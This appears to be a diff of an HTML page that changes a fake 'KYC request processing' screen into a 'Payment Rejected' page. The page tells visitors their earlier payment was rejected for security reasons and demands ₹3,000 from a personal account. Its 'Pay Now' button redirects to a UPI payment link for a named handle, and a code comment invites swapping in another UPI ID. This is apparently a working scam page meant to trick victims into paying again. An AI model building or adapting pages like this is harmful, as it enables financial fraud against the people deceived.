@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Processing...</title>
+  <title>Payment Rejected</title>
   <style>
     body {
-      background-color: #f3f4f6;
+      background-color: #fff3f3;
       font-family: Arial, sans-serif;
       margin: 0;
       padding: 0;
@@ -17,55 +17,59 @@
     }
 
     .card {
-      background-color: white;
-      padding: 28px 20px;
+      background-color: #ffffff;
+      padding: 26px 20px;
       border-radius: 14px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
       text-align: center;
       max-width: 400px;
-      width: 100%;
+      width: 90%;
     }
 
-    .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #3498db;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    h2 {
-      color: #333;
+    .card h2 {
+      color: #d32f2f;
       font-size: 22px;
     }
 
-    p {
+    .card p {
+      color: #444;
       font-size: 16px;
-      color: #555;
-      margin-top: 10px;
+      margin-top: 12px;
+      line-height: 1.5;
     }
 
     .note {
-      margin-top: 15px;
-      font-size: 14px;
       color: #888;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .pay-btn {
+      margin-top: 22px;
+      padding: 14px;
+      width: 100%;
+      background-color: #d32f2f;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .pay-btn:hover {
+      background-color: #b71c1c;
     }
 
     @media (max-width: 480px) {
       .card {
         padding: 22px 16px;
       }
-      h2 {
+      .card h2 {
         font-size: 20px;
       }
-      p {
+      .card p {
         font-size: 15px;
       }
       .note {
@@ -76,10 +80,19 @@
 </head>
 <body>
   <div class="card">
-    <div class="loader"></div>
-    <h2>Processing Your KYC Request</h2>
-    <p>Your KYC & verification are being reviewed.</p>
-    <p class="note">Your request will be processed within <strong>24 hours</strong>. Please wait patiently.</p>
+    <h2>Payment Rejected</h2>
+    <p>Your previous payment was made through an official account and has been rejected for security reasons.</p>
+    <p>To continue, you must complete the payment of <strong>₹3,000</strong> using a verified personal account.</p>
+    <p class="note">Click below to proceed with secure payment.</p>
+    <button class="pay-btn" onclick="redirectToUPI()">Pay Now ₹3,000</button>
   </div>
+
+  <script>
+    function redirectToUPI() {
+      // Replace UPI ID below as needed
+      const upiLink = "upi://pay?pa=paymentmanager8256@okicici&pn=Verification&am=3000&cu=INR";
+      window.location.href = upiLink;
+    }
+  </script>
 </body>
 </html>
